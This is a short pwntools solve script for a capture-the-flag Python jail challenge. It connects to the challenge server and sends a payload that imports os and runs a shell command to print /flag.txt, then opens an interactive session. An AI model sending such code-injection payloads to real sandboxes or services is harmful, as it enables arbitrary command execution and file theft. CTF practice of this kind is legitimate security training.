# Pyjail-1 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5012
context.log_level = "debug"

io = remote(HOST, PORT)

payload = b"import os ; os.system(\'cat /flag.txt\')"

io.sendlineafter(b"yourself?", payload)

io.interactive()